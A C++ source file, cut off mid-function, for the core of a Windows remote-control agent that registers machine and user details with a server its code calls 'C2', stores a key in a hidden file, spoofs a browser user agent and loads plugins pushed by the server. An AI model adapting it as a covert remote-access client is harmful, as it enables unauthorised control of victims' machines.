#include "StubCore.h"
#include "Logger.h"
#include "NetworkFix.h"
#include "AntiHook.h"
#include "Json.h"
#include <map>
#include <vector>
#include <wininet.h>
#include <wincrypt.h>
#include <sstream>
#include <filesystem>
#include <algorithm>
#include <cctype>
#include <cstring>
#include <fstream>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

// ═══════════════════════════════════════════════
// Stub 核心 — TLS 加密网络客户端 + MCP 进程转发
// ═══════════════════════════════════════════════

// ── TLS 证书指纹固定（pinning）──
// 服务端启动日志会打印 "证书 SHA-256 指纹"（64 个 hex 字符）。
// 换用新服务器/重新生成证书时，将新指纹整串粘贴到下面常量并重新编译。
// 注意：直接粘贴 hex 字符串，运行时逐字符比对 ——
// 不要手工转成字节数组（历史上手抄错位导致全员连接失败）。
//
// 本仓库提交的是**全零占位符**，含义是"尚未配置"：IsPinConfigured() 返回 false，
// VerifyServerCertPin() 随即拒绝连接（fail-closed —— 宁可连不上，也不静默接受未校验证书）。
// 所以 clone 后必须替换，否则客户端不会连上任何服务端。取指纹的方式：
//     openssl x509 -in server.crt -noout -fingerprint -sha256 | tr -d ':' | sed 's/.*=//'
//   （服务端首次启动也会把指纹打印到日志）
// 比对大小写不敏感（_stricmp）：openssl 默认输出大写、摘要按小写生成，两者混用不会失败。
static const char* PINNED_CERT_SHA256_HEX =
    "0000000000000000000000000000000000000000000000000000000000000000";

// 校验 hex 字符串格式合法且非全零
static bool IsPinConfigured() {
    if (strlen(PINNED_CERT_SHA256_HEX) != 64) return false;
    bool any = false;
    for (const char* p = PINNED_CERT_SHA256_HEX; *p; p++) {
        char c = *p;
        bool ok = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
        if (!ok) return false;
        if (c != '0') any = true;
    }
    return any;
}

// 校验服务器证书 DER 编码的 SHA-256 是否与固定指纹一致
static bool VerifyServerCertPin(HINTERNET hReq) {
    if (!IsPinConfigured()) {
        LOG_E("TLS", "未配置 PINNED_CERT_SHA256 指纹，拒绝连接（请从服务端日志获取指纹并编译进客户端）");
        return false;
    }
    // 文档化接口：取服务器证书链（INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT = 105）
    PCCERT_CHAIN_CONTEXT pChain = nullptr;
    DWORD sz = sizeof(pChain);
    if (!InternetQueryOptionA(hReq, INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT, &pChain, &sz)
        || !pChain || pChain->cChain < 1 || !pChain->rgpChain[0]
        || pChain->rgpChain[0]->cElement < 1 || !pChain->rgpChain[0]->rgpElement[0]) {
        LOG_E("TLS", "无法获取服务器证书链");
        return false;
    }
    // 叶子证书（链首元素）即服务器本证书
    PCCERT_CONTEXT pCert = pChain->rgpChain[0]->rgpElement[0]->pCertContext;
    if (!pCert) {
        LOG_E("TLS", "证书链中无叶子证书");
        CertFreeCertificateChain(pChain);
        return false;
    }
    bool ok = false;
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    if (CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)
        && CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)
        && CryptHashData(hHash, pCert->pbCertEncoded, pCert->cbCertEncoded, 0)) {
        unsigned char digest[32];
        DWORD dlen = sizeof(digest);
        if (CryptGetHashParam(hHash, HP_HASHVAL, digest, &dlen, 0)) {
            // digest 转 hex 字符串后与 pin 字符串逐字符比对（杜绝手抄字节错位）
            //
            // 2026-10-07 修复：此处原为 strcmp（区分大小写），而本函数用 "%02x" 生成小写，
            // 服务器日志/openssl 打印的却是大写（openssl x509 -fingerprint 默认大写）。
            // 于是"按文档从服务端复制指纹填进来"必然得到 got=小写 / want=大写 的不匹配，
            // 客户端会以"疑似中间人"为由拒绝连接，且错误信息里两串看起来完全一样，
            // 极难排查（实测：三处 TCP 连接全部 ESTABLISHED，唯独卡在这一行）。
            // 指纹是十六进制，大小写无信息量差异，故改为大小写不敏感比较。
            char got[65];
            for (int i = 0; i < 32; i++) snprintf(got + i * 2, 3, "%02x", digest[i]);
            got[64] = 0;
            ok = (dlen == 32) && (_stricmp(got, PINNED_CERT_SHA256_HEX) == 0);
            if (!ok) {
                LOG_E("TLS", ("证书指纹不匹配！got=" + std::string(got) + " want=" + std::string(PINNED_CERT_SHA256_HEX)).c_str());
            }
        }
    } else {
        LOG_E("TLS", "证书哈希计算失败");
    }
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    CertFreeCertificateChain(pChain); // 释放整链（pCert 由链持有，不能单独 Free）
    if (!ok) LOG_E("TLS", "证书指纹校验失败，断开连接（疑似中间人）");
    return ok;
}

// https 请求：放行自签 CA（信任由 pinning 把关，而非系统信任链）
static void SetupSelfSignedTls(HINTERNET hReq) {
    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                   | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                   | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    InternetSetOptionA(hReq, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
}

// 校验来自服务端的文件/目录名：白名单字符集，拒绝路径穿越与命令注入载荷
// 允许: 字母 数字 . _ - 空格 / \（目录分隔）
// 拒绝: 引号、分号、&、|、%、$、..、盘符冒号
static bool IsValidRemoteName(const std::string& name) {
    if (name.empty() || name.size() > 200) return false;
    if (name.find("..") != std::string::npos) return false;
    // 前导分隔符：'\Windows\System32' 会被解析成当前盘根，等于允许写任意位置
    if (name[0] == '\\' || name[0] == '/') return false;
    // 尾部点/空格在 Windows 上会被静默剥离，导致"校验的名字"与"实际落盘的名字"不同
    char last = name[name.size() - 1];
    if (last == '.' || last == ' ') return false;
    for (size_t i = 0; i < name.size(); i++) {
        char c = name[i];
        bool ok = (isalnum((unsigned char)c) || c == '.' || c == '_' || c == '-' ||
                   c == '/' || c == '\\' || c == ' ');
        if (!ok) return false;
    }
    // 保留设备名：CON/PRN/AUX/NUL/COM1-9/LPT1-9（含带扩展名形式，如 CON.txt）
    std::string base = name;
    size_t slash = base.find_last_of("/\\");
    if (slash != std::string::npos) base = base.substr(slash + 1);
    size_t dot = base.find('.');
    std::string stem = (dot == std::string::npos) ? base : base.substr(0, dot);
    for (size_t i = 0; i < stem.size(); i++) stem[i] = (char)toupper((unsigned char)stem[i]);
    if (stem == "CON" || stem == "PRN" || stem == "AUX" || stem == "NUL") return false;
    if (stem.size() == 4 && (stem.compare(0, 3, "COM") == 0 || stem.compare(0, 3, "LPT") == 0) &&
        stem[3] >= '1' && stem[3] <= '9') {
        return false;
    }
    return true;
}

// ── 基础设施辅助 ──────────────────────────────────────────────

static std::string Utf8FromWide(const std::wstring& ws) {
    if (ws.empty()) return std::string();
    int len = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), nullptr, 0, nullptr, nullptr);
    if (len <= 0) return std::string();
    std::string out((size_t)len, '\0');
    WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), &out[0], len, nullptr, nullptr);
    return out;
}

static std::wstring WideFromUtf8(const std::string& s) {
    if (s.empty()) return std::wstring();
    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
    if (len <= 0) return std::wstring();
    std::wstring out((size_t)len, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &out[0], len);
    return out;
}

// SHA-256 → 64 位小写 hex（用系统 CSP，不引第三方库）
static std::string Sha256Hex(const std::string& data) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    std::string out;
    if (!CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return out;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) { CryptReleaseContext(hProv, 0); return out; }
    if (CryptHashData(hHash, (const BYTE*)data.data(), (DWORD)data.size(), 0)) {
        BYTE digest[32] = {};
        DWORD dlen = sizeof(digest);
        if (CryptGetHashParam(hHash, HP_HASHVAL, digest, &dlen, 0) && dlen == 32) {
            char buf[65] = {};
            for (int i = 0; i < 32; i++) snprintf(buf + i * 2, 3, "%02x", digest[i]);
            out.assign(buf, 64);
        }
    }
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return out;
}

static std::string ReadRegString(HKEY root, const wchar_t* subkey, const wchar_t* value) {
    HKEY hKey = nullptr;
    if (RegOpenKeyExW(root, subkey, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS) return std::string();
    wchar_t buf[512] = {};
    DWORD cb = sizeof(buf) - sizeof(wchar_t);
    DWORD type = 0;
    LSTATUS st = RegQueryValueExW(hKey, value, nullptr, &type, (LPBYTE)buf, &cb);
    RegCloseKey(hKey);
    if (st != ERROR_SUCCESS || (type != REG_SZ && type != REG_EXPAND_SZ)) return std::string();
    return Utf8FromWide(buf);
}

// per-agent 密钥持久化位置：%ProgramData%\RemoteIPv6Manager\agent.key
// 内容用 DPAPI 机器范围加密（CryptProtectData），替换 r6m.ini 里的引导密钥长期使用。
static std::wstring AgentKeyStorePath() {
    wchar_t programData[MAX_PATH] = {};
    DWORD n = GetEnvironmentVariableW(L"ProgramData", programData, MAX_PATH);
    std::wstring dir = (n > 0 && n < MAX_PATH) ? std::wstring(programData) : std::wstring(L"C:\\ProgramData");
    dir += L"\\RemoteIPv6Manager";
    CreateDirectoryW(dir.c_str(), nullptr);
    return dir + L"\\agent.key";
}

static bool DpapiProtect(const std::string& plain, std::vector<BYTE>& out) {
    DATA_BLOB in = { (DWORD)plain.size(), (BYTE*)plain.data() };
    DATA_BLOB enc = {};
    if (!CryptProtectData(&in, L"r6m-agent-key", nullptr, nullptr, nullptr,
                          CRYPTPROTECT_LOCAL_MACHINE, &enc)) return false;
    out.assign(enc.pbData, enc.pbData + enc.cbData);
    LocalFree(enc.pbData);
    return true;
}

static bool DpapiUnprotect(const std::vector<BYTE>& enc, std::string& plain) {
    if (enc.empty()) return false;
    DATA_BLOB in = { (DWORD)enc.size(), (BYTE*)enc.data() };
    DATA_BLOB dec = {};
    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, CRYPTPROTECT_LOCAL_MACHINE, &dec)) return false;
    plain.assign((const char*)dec.pbData, dec.cbData);
    LocalFree(dec.pbData);
    return true;
}

// ── 密钥内存卫生（方案1）──
// 存放：明文 key 与随机 mask 异或后保存，两成员长驻但均无明文特征
void StubCore::setAgentKeyPlain(const char* key) {
    if (!_agentKeyObf.empty()) SecureZeroMemory(&_agentKeyObf[0], _agentKeyObf.size());
    if (!_keyMask.empty()) SecureZeroMemory(&_keyMask[0], _keyMask.size());
    _agentKeyObf.clear();
    _keyMask.clear();
    if (!key || !*key) return;
    size_t len = strlen(key);
    _agentKeyObf.resize(len);
    _keyMask.resize(len);
    // 生成随机掩码（BCryptGenRandom 不可用则退化为简单熵源）
    HCRYPTPROV hProv = 0;
    bool haveCsp = CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) != 0;
    for (size_t i = 0; i < len; i++) {
        unsigned char r = 0;
        if (haveCsp) {
            BYTE b = 0;
            if (!CryptGenRandom(hProv, 1, &b)) b = (BYTE)(GetTickCount() ^ i);
            r = b;
        } else {
            r = (BYTE)(GetTickCount() ^ (i * 131));
        }
        _keyMask[i] = r;
        _agentKeyObf[i] = key[i] ^ r;
    }
    if (haveCsp) CryptReleaseContext(hProv, 0);
}

// 在栈上构造 "X-Agent-Key: <key>\r\n" + "X-Agent-HWID: <hwid>\r\n" 头，
// 用后由调用方 SecureZeroMemory。
// 返回的 std::string 内容即含明文——调用方必须在发送完成后立即 wipe。
static std::string BuildAgentKeyHeader(const std::string& obf, const std::string& mask,
                                       const std::string& hwid) {
    std::string hdr;
    if (obf.empty()) return hdr;
    hdr.reserve(obf.size() + hwid.size() + 48);
    hdr += "X-Agent-Key: ";
    for (size_t i = 0; i < obf.size(); i++) hdr += (char)(obf[i] ^ mask[i]);
    hdr += "\r\n";
    if (!hwid.empty()) hdr += "X-Agent-HWID: " + hwid + "\r\n";
    return hdr;
}

// 擦除 string 内容（先覆写再清空，防优化器把写操作消除）
static void WipeString(std::string& s) {
    if (!s.empty()) {
        SecureZeroMemory(&s[0], s.size());
    }
    s.clear();
}

StubCore::StubCore() {
    LOG_I("Stub", "Constructor start");
    // 配置优先级：命令行参数 > 环境变量 > exe 同目录 r6m.ini
    // r6m.ini 格式（UTF-8，无 BOM）：
    //   server=https://[v6地址]:8443
    //   agent_key=64位hex引导密钥
    _serverUrl = "https://[::1]:8080";

    // 1) 环境变量
    if (const char* s = getenv("R6M_SERVER")) _serverUrl = s;
    if (const char* k = getenv("R6M_AGENT_KEY")) setAgentKeyPlain(k);

    // 2) 配置文件兜底（仅当环境变量未设置时）
    if (getenv("R6M_SERVER") == nullptr || getenv("R6M_AGENT_KEY") == nullptr) {
        wchar_t exePath[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, exePath, MAX_PATH);
        std::wstring ws(exePath);
        ws = ws.substr(0, ws.find_last_of(L'\\'));
        std::ifstream ini(ws + L"\\r6m.ini");
        if (ini.is_open()) {
            std::string line;
            while (std::getline(ini, line)) {
                // 去掉 \r 和首尾空格
                while (!line.empty() && (line.back() == '\r' || line.back() == ' ')) line.pop_back();
                auto eq = line.find('=');
                if (eq == std::string::npos) continue;
                std::string key = line.substr(0, eq), val = line.substr(eq + 1);
                if (key == "server" && getenv("R6M_SERVER") == nullptr && !val.empty()) {
                    _serverUrl = val;
                    LOG_I("Stub", "config: server loaded from r6m.ini");
                } else if (key == "agent_key" && !hasAgentKey() && !val.empty()) {
                    setAgentKeyPlain(val.c_str());
                    // 擦除栈上副本
                    SecureZeroMemory(&val[0], val.size());
                    LOG_I("Stub", "config: agent_key loaded from r6m.ini");
                }
            }
        }
    }

    // 引导密钥留一份副本：持久化密钥失效（服务端换了/被吊销）时要能回退
    rememberBootstrapKey();
    if (loadPersistedAgentKey()) {
        LOG_I("Stub", "已装入本机持久化 per-agent 密钥（无需再用引导密钥登记）");
    }

    LOG_I("Stub", "Setting up HTTP session...");
    _hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
    if (_hSession) {
        LOG_I("Stub", "HTTP session OK");
    } else {
        LOG_E("Stub", "HTTP session FAILED");
    }
    if (!hasAgentKey()) {
        LOG_E("Stub", "未配置密钥（r6m.ini / R6M_AGENT_KEY / --agent-key 均未提供），服务端将拒绝本客户端");
    }
    LOG_I("Stub", "Constructor done");
}

StubCore::~StubCore() {
    _running = false;
    if (_heartbeatThread.joinable()) _heartbeatThread.join();
    if (_hSession) InternetCloseHandle(_hSession);
}

// ── HTTP ──

bool StubCore::httpRequest(const char* method, const std::string& path, const std::string& body,
                           bool withCredentials, std::string& response) {
    response.clear();

    // 明文 HTTP 直接拒绝：密钥、指令、文件内容全部裸奔，没有任何"降级可用"的余地
    if (_serverUrl.compare(0, 8, "https://") != 0) {
        LOG_E("HTTP", "服务器地址必须是 https://（当前非 https），拒绝发送任何数据");
        return false;
    }

    std::string url = _serverUrl + path;
    LOG_D("HTTP", ((std::string(method) + " " + url).c_str()));

    URL_COMPONENTS urlComp = {};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = 1;
    urlComp.dwHostNameLength = 1;
    urlComp.dwUrlPathLength = 1;
    urlComp.dwExtraInfoLength = 1;

    if (!InternetCrackUrlA(url.c_str(), (DWORD)url.size(), 0, &urlComp)) {
        LOG_E("HTTP", "URL parse failed");
        return false;
    }
    std::string host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::string pathStr(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    if (urlComp.dwExtraInfoLength > 0) {
        pathStr += std::string(urlComp.lpszExtraInfo, urlComp.dwExtraInfoLength);
    }
    int port = urlComp.nPort;
    bool isHttps = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);

    LOG_D("HTTP", ("Host: " + host + " Port: " + std::to_string(port) + (isHttps ? " (TLS)" : "")).c_str());

    HINTERNET hConn = InternetConnectA(_hSession, host.c_str(), (INTERNET_PORT)port,
        nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) {
        LOG_E("HTTP", "InternetConnect failed");
        return false;
    }

    DWORD reqFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI;
    if (isHttps) reqFlags |= INTERNET_FLAG_SECURE;

    HINTERNET hReq = HttpOpenRequestA(hConn, method, pathStr.c_str(), nullptr, nullptr,
        nullptr, reqFlags, 0);
    if (!hReq) {
        LOG_E("HTTP", "HttpOpenRequest failed");
        InternetCloseHandle(hConn);
        return false;
    }

    if (isHttps) SetupSelfSignedTls(hReq);

    DWORD timeout = 30000;
    InternetSetOption(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOption(hReq, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));

    std::string headers;
    if (!body.empty()) headers += "Content-Type: application/json\r\n";
    if (withCredentials) {
        std::string keyHdr = BuildAgentKeyHeader(_agentKeyObf, _keyMask, _hwid);
        headers += keyHdr;
        WipeString(keyHdr);
    }
    if (!HttpSendRequestA(hReq, headers.empty() ? nullptr : headers.c_str(), (DWORD)headers.size(),
                          body.empty() ? nullptr : (LPVOID)body.c_str(), (DWORD)body.size())) {
        LOG_E("HTTP", "HttpSendRequestA failed");
        WipeString(headers);
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }
    WipeString(headers); // 含密钥明文，发送后立即擦

    // 指纹复核（纵深防御）。注意：真正的保护在 probeAndVerifyPin()——
    // 凭据只在探测通过之后才可能被发出去，所以中间人拿不到密钥。
    if (isHttps && !VerifyServerCertPin(hReq)) {
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }

    char buf[65536];
    DWORD bytesRead = 0;
    std::string result;
    while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0) {
        buf[bytesRead] = 0;
        result += buf;
    }
    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    response = result;
    LOG_D("HTTP", ("Response: " + result.substr(0, 100)).c_str());
    return true;
}

bool StubCore::httpPost(const std::string& path, const std::string& body, std::string& response) {
    return httpRequest("POST", path, body, true, response);
}

std::string StubCore::httpGet(const std::string& path) {
    std::string resp;
    httpRequest("GET", path, std::string(), true, resp);
    return resp;
}

// 两阶段连接的关键第一步：不带任何凭据请求 /api/health，
// 此时过网的只有一次 TLS 握手与一个无敏感信息的 GET。
// 指纹不匹配 → 直接失败 → 引导密钥与 per-agent 密钥从不离开本机。
bool StubCore::probeAndVerifyPin() {
    if (!IsPinConfigured()) {
        LOG_E("TLS", "未配置 PINNED_CERT_SHA256 指纹，拒绝连接");
        return false;
    }
    std::string resp;
    if (!httpRequest("GET", "/api/health", std::string(), false, resp)) {
        LOG_W("TLS", "无凭据探测失败（网络不可达或证书指纹不匹配）");
        return false;
    }
    r6m::Json j;
    std::string err;
    if (!r6m::Json::parse(resp, j, &err) || !j.getBool("ok", false)) {
        LOG_E("TLS", ("探测响应异常，拒绝继续: " + resp.substr(0, 120)).c_str());
        return false;
    }
    LOG_I("TLS", "指纹校验通过（凭据尚未发送）");
    return true;
}

// ── per-agent 密钥持久化（DPAPI 机器范围）──
bool StubCore::loadPersistedAgentKey() {
    std::wstring path = AgentKeyStorePath();
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD size = GetFileSize(h, nullptr);
    if (size == INVALID_FILE_SIZE || size == 0 || size > 8192) { CloseHandle(h); return false; }
    std::vector<BYTE> enc(size);
    DWORD got = 0;
    BOOL ok = ReadFile(h, enc.data(), size, &got, nullptr);
    CloseHandle(h);
    if (!ok || got != size) return false;
    std::string plain;
    if (!DpapiUnprotect(enc, plain) || plain.empty()) {
        LOG_W("Stub", "持久化密钥解密失败（换了机器/用户？），将回退引导密钥重新登记");
        return false;
    }
    setAgentKeyPlain(plain.c_str());
    SecureZeroMemory(&plain[0], plain.size());
    return true;
}

void StubCore::persistAgentKey(const std::string& key) {
    std::vector<BYTE> enc;
    if (!DpapiProtect(key, enc)) {
        LOG_W("Stub", "DPAPI 加密失败，密钥无法持久化（重启后需重新登记）");
        return;
    }
    std::wstring path = AgentKeyStorePath();
    HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_HIDDEN, nullptr);
    if (h == INVALID_HANDLE_VALUE) {
        LOG_W("Stub", ("无法写入持久化密钥（err=" + std::to_string(GetLastError()) + "）").c_str());
        return;
    }
    DWORD written = 0;
    WriteFile(h, enc.data(), (DWORD)enc.size(), &written, nullptr);
    CloseHandle(h);
    LOG_I("Stub", "per-agent 密钥已持久化（DPAPI 机器范围）");
}

void StubCore::rememberBootstrapKey() {
    _bootstrapKeyObf = _agentKeyObf;
    _bootstrapKeyMask = _keyMask;
}

void StubCore::clearFuse(const char* why) {
    _integrityCompromised = false;
    _consecutiveOkChecks = 0;
    LOG_W("Stub", (std::string("完整性熔断已解除（") + why + "），恢复指令执行").c_str());
}

// ── 主循环 ──


void StubCore::run(const std::wstring& pluginDir) {
    _running = true;
    LOG_INFO("Stub", "=== START ===");

    // Parse command line
    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    for (int i = 1; i < argc; i++) {
        if (std::wstring(argv[i]) == L"--server" && i + 1 < argc) {
            std::wstring ws(argv[i + 1]);
            _serverUrl = std::string(ws.begin(), ws.end());
        }
        if (std::wstring(argv[i]) == L"--agent-key") {
            // 已移除：命令行对同机任何进程可读（WMI/任务管理器/EDR 日志），
            // 引导密钥放这里等于公开。请改用 r6m.ini、R6M_AGENT_KEY 环境变量，
            // 或提权时自动生成的受限 DACL 临时配置。
            LOG_W("Stub", "--agent-key 不再支持（密钥不得经命令行传递），请改用 r6m.ini 或 R6M_AGENT_KEY");
            if (i + 1 < argc) SecureZeroMemory(argv[i + 1], wcslen(argv[i + 1]) * sizeof(wchar_t));
        }
    }
    if (argv) LocalFree(argv);
    // 明文 URL 直接终止：原来是"只记一行日志然后照发密钥"
    if (_serverUrl.compare(0, 8, "https://") != 0) {
        LOG_E("Stub", "服务器地址必须以 https:// 开头，拒绝启动（不降级、不裸奔）");
        _running = false;
        return;
    }
    LOG_INFO("Stub", ("URL=" + _serverUrl).c_str());

    LOG_INFO("Stub", "A: Network fix");
    NetworkFix::FixAll(_serverUrl);
    LOG_INFO("Stub", "B: Network done");

    LOG_INFO("Stub", "C: HWID");
    _hwid = generateHWID();
    LOG_INFO("Stub", ("HWID=" + _hwid).c_str());

    // 注意：插件/Python 同步必须在注册之后（D' 步）——
    // per-agent 密钥模型下，注册前只有引导密钥，下载接口会 401。

    // 连接前验证 C2 可达，最多重试 3 次，指数退避
    LOG_INFO("Stub", "E: Verify C2 reachable");
    for (int attempt = 1; attempt <= 3; ++attempt) {
        if (NetworkFix::VerifyC2Reachable(_serverUrl)) {
            LOG_INFO("Stub", ("C2 reachable on attempt " + std::to_string(attempt)).c_str());
            break;
        }
        LOG_WARN("Stub", ("C2 unreachable, attempt " + std::to_string(attempt) + "/3, waiting...").c_str());
        std::this_thread::sleep_for(std::chrono::seconds(attempt * 5));
    }

    // AntiHook 基线检查（三段式之一：检测）—— 连接前体检一次
    {
        std::vector<ApiIntegrityReport> reports;
        LOG_INFO("Stub", "H: AntiHook baseline check");
        if (AntiHook::CheckCriticalApis(reports)) {
            LOG_INFO("Stub", "AntiHook baseline: all critical APIs intact");
        } else if (AntiHook::HasTampered(reports)) {
            _integrityCompromised = true;
            LOG_E("Stub", "AntiHook baseline: 确认关键 API 入口被篡改，进入熔断状态（详见 AntiHook 日志）");
        } else {
            // 仅"无法验证"（模块未加载/转发导出/权限不足）：告警但不熔断。
            // 服务端可通过 POST /api/integrity/clear?hwid=... 下发解除。
            LOG_WARN("Stub", "AntiHook baseline: 存在无法验证的关键 API，仅告警不熔断");
        }
        AntiHook::LogReports(reports);
        if (AntiHook::HasUnverifiable(reports)) {
            // 无法验证 ≠ 已被篡改：只告警，绝不因此熔断（原实现会让一次
            // 未加载的模块/转发导出把 agent 永久锁死且无恢复通道）
            LOG_WARN("Stub", "AntiHook: 存在无法验证的关键 API（已计入上报，不触发熔断）");
        }
    }

    // E'：发凭据之前先校验 TLS 指纹（这一步过网的只有一次无凭据探测）
    LOG_INFO("Stub", "E': TLS pin probe (before any credential)");
    {
        bool pinOk = false;
        for (int attempt = 1; attempt <= 5 && !pinOk; ++attempt) {
            pinOk = probeAndVerifyPin();
            if (!pinOk) {
                LOG_WARN("Stub", ("TLS 探测失败 " + std::to_string(attempt) + "/5，稍后重试").c_str());
                std::this_thread::sleep_for(std::chrono::seconds(attempt * 3));
            }
        }
        if (!pinOk) {
            LOG_E("Stub", "TLS 指纹未能校验通过：拒绝发送任何密钥（疑似中间人，或服务端不可达）");
            _running = false;
            return;
        }
    }

    LOG_INFO("Stub", "F: Connect");
    for (int attempt = 1; attempt <= 5; ++attempt) {
        if (connectToServer()) break;
        LOG_WARN("Stub", ("Connect failed, attempt " + std::to_string(attempt) + "/5, retry in " + std::to_string(attempt * 3) + "s").c_str());
        std::this_thread::sleep_for(std::chrono::seconds(attempt * 3));
    }

    // D': 插件同步 —— 必须在注册之后：此时已换成本机独立密钥，
    // 下载接口（/api/runtime、/api/plugins*）才会放行
    LOG_INFO("Stub", "D': Plugins (after register)");
    syncPlugins(pluginDir);       // 从服务端同步缺失的插件 + 嵌入式 Python

    // 设置嵌入式 Python 路径
    {
        wchar_t ep[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, ep, MAX_PATH);
        std::wstring ws(ep); ws = ws.substr(0, ws.find_last_of(L'\\'));
        std::wstring py = ws + L"\\runtime\\python.exe";
        if (GetFileAttributesW(py.c_str()) != INVALID_FILE_ATTRIBUTES) {
            _plugins.setPythonPath(py);
            LOG_INFO("Stub", "Embedded Python found");
        }
    }

    _plugins.scanPlugins(pluginDir);
    _plugins.buildToolMap();

    LOG_INFO("Stub", "F: Heartbeat thread");
    _heartbeatThread = std::thread([this]() {
        while (_running) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            try {
                // 心跳携带完整性状态（三段式之二：上报）
                std::string integrity = AntiHook::SummaryForHeartbeat();
                if (integrity.compare(0, 8, "tampered") == 0) {
                    // 三段式之三：置熔断标志。只有"确认被篡改"才熔断，
                    // "无法验证"（模块未加载/转发导出）由 AntiHook 归为 unverifiable，不熔断。
                    _integrityCompromised = true;
                    _consecutiveOkChecks = 0;
                } else if (integrity == "ok") {
                    if (++_consecutiveOkChecks >= 3 && _integrityCompromised) {
                        clearFuse("连续 3 次完整性自检正常");
                    }
                }
                r6m::Json hb = r6m::Json::makeObject();
                hb.set("hwid", r6m::Json::makeString(_hwid));
                hb.set("integrity", r6m::Json::makeString(integrity));
                std::string body = hb.dump();
                std::string resp;
                httpPost("/api/heartbeat", body, resp);
            } catch (...) {}
        }
    });
    LOG_INFO("Stub", "G: Poll loop");
    pollLoop();
    _running = false;
    _plugins.stopAll();
    LOG_INFO("Stub", "====== RemoteClient 退出 ======");
}

bool StubCore::connectToServer() {
    LOG_INFO("Stub", ("连接: " + _serverUrl).c_str());

    // 用结构化方式构造注册体（计算机名/用户名含特殊字符时不会被拼坏）
    r6m::Json info = r6m::Json::makeObject();
    {
        wchar_t computer[MAX_PATH] = {}; DWORD csz = MAX_PATH;
        GetComputerNameW(computer, &csz);
        wchar_t user[MAX_PATH] = {}; DWORD usz = MAX_PATH;
        GetUserNameW(user, &usz);
        unsigned int hash = 5381;
        std::string cs = Utf8FromWide(computer);
        for (size_t i = 0; i < cs.size(); i++) hash = ((hash << 5) + hash) + (unsigned char)cs[i];
        info.set("computer", r6m::Json::makeString(cs));
        info.set("user", r6m::Json::makeString(Utf8FromWide(user)));
        // OS 版本：RtlGetVersion 拿真实内部版本号（GetVersionEx 会因清单被谎报）
        std::string osName = "Windows";
        {
            typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
            auto fn = (RtlGetVersionPtr)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
            if (fn) {
                RTL_OSVERSIONINFOW rovi = { sizeof(rovi) };
                if (fn(&rovi) == 0) {
                    char b[64] = {};
                    snprintf(b, sizeof(b), "Windows %lu.%lu Build %lu",
                             (unsigned long)rovi.dwMajorVersion, (unsigned long)rovi.dwMinorVersion,
                             (unsigned long)rovi.dwBuildNumber);
                    osName = b;
                }
            }
        }
        info.set("os", r6m::Json::makeString(osName));
        info.set("arch", r6m::Json::makeString(sizeof(void*) == 8 ? "x64" : "x86"));
        (void)hash;
    }

    r6m::Json body = r6m::Json::makeObject();
    body.set("hwid", r6m::Json::makeString(_hwid));
    body.set("info", info);

    std::string resp;
    bool sent = httpPost("/api/agent/register", body.dump(), resp);

    // 已登记 hwid 只认自己的 per-agent 密钥：若持久化密钥失效（服务端换过/被吊销），
    // 回退用引导密钥重登记一次（仅限"确实拿不到有效密钥"这种情况）
    if (sent) {
        r6m::Json j;
        std::string err;
